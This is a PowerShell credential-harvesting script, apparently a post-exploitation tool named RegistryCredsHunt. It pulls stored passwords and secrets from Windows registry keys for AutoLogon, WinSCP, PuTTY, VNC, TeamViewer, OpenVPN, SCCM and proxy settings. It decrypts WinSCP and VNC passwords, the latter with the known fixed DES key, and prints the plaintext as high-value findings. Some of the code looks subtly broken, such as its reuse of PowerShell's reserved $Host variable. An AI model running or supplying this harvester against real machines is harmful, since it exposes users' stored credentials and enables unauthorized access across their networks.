$findings = [System.Collections.Generic.List[PSCustomObject]]::new()

function Is-CredLike {
    param([string]$Val)
    if ($Val.Length -lt 6) { return $false }
    $score = 0
    if ($Val -cmatch '[A-Z]')          { $score++ }
    if ($Val -cmatch '[a-z]')          { $score++ }
    if ($Val -match '\d')              { $score++ }
    if ($Val -match '[^a-zA-Z0-9\s]') { $score++ }
    return ($score -ge 3 -or ($score -ge 2 -and $Val.Length -ge 12))
}

function Add-Finding {
    param($Source, $Label, $Attr, $Val, [bool]$Decrypted = $false)
    if ([string]::IsNullOrWhiteSpace($Val)) { return }
    $findings.Add([PSCustomObject]@{
        Source    = $Source
        Label     = $Label
        Attr      = $Attr
        Value     = $Val
        Decrypted = $Decrypted
        CredLike  = Is-CredLike $Val
    })
}

function Get-RegVal {
    param([string]$Path, [string]$Name)
    try {
        $v = (Get-ItemProperty -Path $Path -Name $Name -ErrorAction Stop).$Name
        return $v
    } catch { return $null }
}

function Decrypt-VNC {
    param([object]$Raw)
    try {
        if ($Raw -is [byte[]]) { $bytes = $Raw }
        elseif ($Raw -is [string]) {
            $hex = $Raw -replace '\s',''
            $bytes = New-Object byte[] ($hex.Length / 2)
            for ($i = 0; $i -lt $hex.Length; $i += 2) {
                $bytes[$i/2] = [Convert]::ToByte($hex.Substring($i,2),16)
            }
        } else { return $null }
        if ($bytes.Length -lt 8) { return $null }
        $key = [byte[]](0x17,0x52,0x66,0x23,0xa2,0x9c,0x5c,0x05)
        $des = [System.Security.Cryptography.DES]::Create()
        $des.Key     = $key
        $des.Mode    = [System.Security.Cryptography.CipherMode]::ECB
        $des.Padding = [System.Security.Cryptography.PaddingMode]::None
        $dec    = $des.CreateDecryptor()
        $result = $dec.TransformFinalBlock($bytes, 0, 8)
        $plain  = [System.Text.Encoding]::ASCII.GetString($result).TrimEnd([char]0)
        if ($plain -match '^[\x20-\x7E]+$') { return $plain }
        return $null
    } catch { return $null }
}

function Decrypt-WinSCP {
    param([string]$Enc, [string]$User, [string]$Host)
    try {
        $MAGIC = 0xA3
        $idx   = 0
        function nxt {
            if ($idx + 1 -ge $Enc.Length) { return 0 }
            $a = [Convert]::ToInt32($Enc[$idx].ToString(), 16)
            $b = [Convert]::ToInt32($Enc[$idx+1].ToString(), 16)
            $script:idx += 2
            return ([int]((-bnot (($b -bor ($a -shl 4)) -bxor $MAGIC)) -band 0xFF))
        }
        $flag = nxt
        if ($flag -eq 0xFF) {
            $null = nxt
            $kLen = nxt
            for ($i = 0; $i -lt $kLen; $i++) { $null = nxt }
        }
        $pLen   = nxt
        $result = ''
        for ($i = 0; $i -lt $pLen; $i++) { $result += [char](nxt) }
        if ($result -match '^[\x20-\x7E]+$' -and $result.Length -gt 0) { return $result }
        return $null
    } catch { return $null }
}

Write-Host "[*] AutoLogon..." -ForegroundColor DarkGray
$wl = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
foreach ($attr in @('DefaultUserName','DefaultPassword','AltDefaultPassword','DefaultDomainName')) {
    $v = Get-RegVal $wl $attr
    if ($v) { Add-Finding 'AutoLogon' 'Winlogon' $attr $v }
}

Write-Host "[*] WinSCP sessions..." -ForegroundColor DarkGray
$wscpBase = 'HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions'
if (Test-Path $wscpBase) {
    Get-ChildItem $wscpBase -ErrorAction SilentlyContinue | ForEach-Object {
        $session  = $_.PSChildName
        $hostname = Get-RegVal $_.PSPath 'HostName'
        $username = Get-RegVal $_.PSPath 'UserName'
        $encPass  = Get-RegVal $_.PSPath 'Password'
        if ($hostname) { Add-Finding 'WinSCP' $session 'HostName' $hostname }
        if ($username) { Add-Finding 'WinSCP' $session 'UserName' $username }
        if ($encPass) {
            $plain = Decrypt-WinSCP $encPass "$username" "$hostname"
            if ($plain) { Add-Finding 'WinSCP' $session 'Password' $plain $true }
            else        { Add-Finding 'WinSCP' $session 'Password(enc)' $encPass }
        }
    }
}

Write-Host "[*] PuTTY sessions..." -ForegroundColor DarkGray
$puttyBase = 'HKCU:\Software\SimonTatham\PuTTY\Sessions'
if (Test-Path $puttyBase) {
    Get-ChildItem $puttyBase -ErrorAction SilentlyContinue | ForEach-Object {
        $session = [System.Web.HttpUtility]::UrlDecode($_.PSChildName)
        $host    = Get-RegVal $_.PSPath 'HostName'
        $user    = Get-RegVal $_.PSPath 'UserName'
        $proxyPw = Get-RegVal $_.PSPath 'ProxyPassword'
        $proxyU  = Get-RegVal $_.PSPath 'ProxyUsername'
        if ($host)    { Add-Finding 'PuTTY' $session 'HostName' $host }
        if ($user)    { Add-Finding 'PuTTY' $session 'UserName' $user }
        if ($proxyU)  { Add-Finding 'PuTTY' $session 'ProxyUser' $proxyU }
        if ($proxyPw) { Add-Finding 'PuTTY' $session 'ProxyPass' $proxyPw }
    }
}

Write-Host "[*] VNC passwords..." -ForegroundColor DarkGray
$vncPaths = @(
    @{ Path='HKLM:\SOFTWARE\RealVNC\WinVNC4';                  Name='Password';        Label='RealVNC' },
    @{ Path='HKLM:\SOFTWARE\RealVNC\vncserver';                Name='Password';        Label='RealVNC' },
    @{ Path='HKLM:\SOFTWARE\TightVNC\Server';                  Name='Password';        Label='TightVNC' },
    @{ Path='HKLM:\SOFTWARE\TightVNC\Server';                  Name='ControlPassword'; Label='TightVNC-Control' },
    @{ Path='HKLM:\SOFTWARE\TigerVNC\WinVNC4';                 Name='Password';        Label='TigerVNC' },
    @{ Path='HKLM:\SOFTWARE\WOW6432Node\RealVNC\WinVNC4';     Name='Password';        Label='RealVNC32' },
    @{ Path='HKLM:\SOFTWARE\WOW6432Node\TightVNC\Server';     Name='Password';        Label='TightVNC32' }
)
foreach ($entry in $vncPaths) {
    if (-not (Test-Path $entry.Path -ErrorAction SilentlyContinue)) { continue }
    $raw = Get-RegVal $entry.Path $entry.Name
    if ($raw) {
        $plain = Decrypt-VNC $raw
        if ($plain) { Add-Finding 'VNC' $entry.Label $entry.Name $plain $true }
        else {
            $hex = ($raw | ForEach-Object { '{0:X2}' -f $_ }) -join ''
            Add-Finding 'VNC' $entry.Label "$($entry.Name)(enc)" $hex
        }
    }
}

Write-Host "[*] SNMP community strings..." -ForegroundColor DarkGray
$snmpPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities'
if (Test-Path $snmpPath -ErrorAction SilentlyContinue) {
    (Get-Item $snmpPath).Property | ForEach-Object {
        Add-Finding 'SNMP' 'ValidCommunities' 'Community' $_
    }
}

Write-Host "[*] TeamViewer..." -ForegroundColor DarkGray
$tvPaths = @(
    'HKLM:\SOFTWARE\TeamViewer',
    'HKLM:\SOFTWARE\WOW6432Node\TeamViewer',
    'HKCU:\SOFTWARE\TeamViewer'
)
foreach ($p in $tvPaths) {
    if (-not (Test-Path $p -ErrorAction SilentlyContinue)) { continue }
    foreach ($attr in @('SecurityPasswordAES','SecurityPassword','OwnershipToken','LicenseKeyV2')) {
        $v = Get-RegVal $p $attr
        if ($v) {
            $hex = if ($v -is [byte[]]) { ($v | ForEach-Object { '{0:X2}' -f $_ }) -join '' } else { $v }
            Add-Finding 'TeamViewer' 'TeamViewer' "$attr(AES-enc)" $hex
        }
    }
}

Write-Host "[*] OpenVPN GUI..." -ForegroundColor DarkGray
$ovpnBase = 'HKCU:\Software\OpenVPN-GUI\configs'
if (Test-Path $ovpnBase -ErrorAction SilentlyContinue) {
    Get-ChildItem $ovpnBase -ErrorAction SilentlyContinue | ForEach-Object {
        $name = $_.PSChildName
        foreach ($attr in @('username','password','auth-data')) {
            $v = Get-RegVal $_.PSPath $attr
            if ($v) { Add-Finding 'OpenVPN' $name $attr $v }
        }
    }
}

Write-Host "[*] mRemoteNG pointer..." -ForegroundColor DarkGray
$mrng = 'HKCU:\Software\mRemoteNG'
if (Test-Path $mrng -ErrorAction SilentlyContinue) {
    foreach ($attr in @('ConnectionFile','PasswordFile')) {
        $v = Get-RegVal $mrng $attr
        if ($v) { Add-Finding 'mRemoteNG' 'mRemoteNG' $attr $v }
    }
    $confPath = "$env:APPDATA\mRemoteNG\confCons.xml"
    if (Test-Path $confPath) {
        Add-Finding 'mRemoteNG' 'mRemoteNG' 'ConfigFile' $confPath
    }
}

Write-Host "[*] RDP MRU..." -ForegroundColor DarkGray
$rdpBase = 'HKCU:\Software\Microsoft\Terminal Server Client\Servers'
if (Test-Path $rdpBase -ErrorAction SilentlyContinue) {
    Get-ChildItem $rdpBase -ErrorAction SilentlyContinue | ForEach-Object {
        $server = $_.PSChildName
        $user   = Get-RegVal $_.PSPath 'UsernameHint'
        Add-Finding 'RDP-MRU' $server 'HostName' $server
        if ($user) { Add-Finding 'RDP-MRU' $server 'UserHint' $user }
    }
}

Write-Host "[*] Git Credential Manager..." -ForegroundColor DarkGray
$gcm = 'HKCU:\Software\GitCredentialManager'
if (Test-Path $gcm -ErrorAction SilentlyContinue) {
    foreach ($attr in @('authority','GitHubAuthModes')) {
        $v = Get-RegVal $gcm $attr
        if ($v) { Add-Finding 'GCM' 'GitCredentialManager' $attr $v }
    }
}
@("$env:APPDATA\Microsoft\UserSecrets","$env:LOCALAPPDATA\.gitconfig-credential") | ForEach-Object {
    if (Test-Path $_) { Add-Finding 'GCM' 'Git' 'ArtifactPath' $_ }
}

Write-Host "[*] SCCM Network Access Account..." -ForegroundColor DarkGray
$sccmPath = 'HKLM:\SOFTWARE\Microsoft\SMS\Client\ClientComponents\NetworkAccessAccount'
if (Test-Path $sccmPath -ErrorAction SilentlyContinue) {
    foreach ($attr in @('NetworkAccessUsername','NetworkAccessPassword')) {
        $v = Get-RegVal $sccmPath $attr
        if ($v) { Add-Finding 'SCCM' 'NetworkAccessAccount' $attr $v }
    }
}

Write-Host "[*] Misc credential keys..." -ForegroundColor DarkGray
$miscChecks = @(
    @{ Path='HKCU:\Software\ORL\WinVNC3';                              Attrs=@('Password') },
    @{ Path='HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters'; Attrs=@('AuthenticationTraps') },
    @{ Path='HKCU:\Software\SimonTatham\PuTTY\SshHostKeys';           Attrs=@() },
    @{ Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'; Attrs=@('ProxyUser','ProxyPass') }
)
foreach ($chk in $miscChecks) {
    if (-not (Test-Path $chk.Path -ErrorAction SilentlyContinue)) { continue }
    if ($chk.Attrs.Count -eq 0) {
        $label = Split-Path $chk.Path -Leaf
        Add-Finding 'Misc' $label 'Exists' $chk.Path
        continue
    }
    foreach ($attr in $chk.Attrs) {
        $v = Get-RegVal $chk.Path $attr
        if ($v) {
            $label = Split-Path $chk.Path -Leaf
            Add-Finding 'Misc' $label $attr $v
        }
    }
}

Write-Host ""

if ($findings.Count -eq 0) {
    Write-Host "No registry credentials found." -ForegroundColor Green
    exit 0
}

Write-Host "=== RegistryCredsHunt ===" -ForegroundColor Cyan
Write-Host ""

$creds = $findings | Where-Object { $_.CredLike -or $_.Decrypted }
$other = $findings | Where-Object { -not $_.CredLike -and -not $_.Decrypted }

if ($creds) {
    Write-Host "[HIGH VALUE]" -ForegroundColor Yellow
    foreach ($f in ($creds | Sort-Object Source, Label)) {
        $tag = if ($f.Decrypted) { ' [DECRYPTED]' } else { '' }
        Write-Host "  [$($f.Source.PadRight(10))] $($f.Label)$tag" -ForegroundColor Yellow
        Write-Host "    $($f.Attr): $($f.Value)"
    }
    Write-Host ""
}

if ($other) {
    $types = $other | Select-Object -ExpandProperty Source -Unique | Sort-Object
    foreach ($src in $types) {
        Write-Host "[$src]" -ForegroundColor DarkCyan
        $other | Where-Object { $_.Source -eq $src } | ForEach-Object {
            Write-Host "  $($_.Label) -> $($_.Attr)"
            Write-Host "    $($_.Value)"
        }
        Write-Host ""
    }
}

Write-Host "Total: $($findings.Count) finding(s)  ($($creds.Count) high value)" -ForegroundColor DarkGray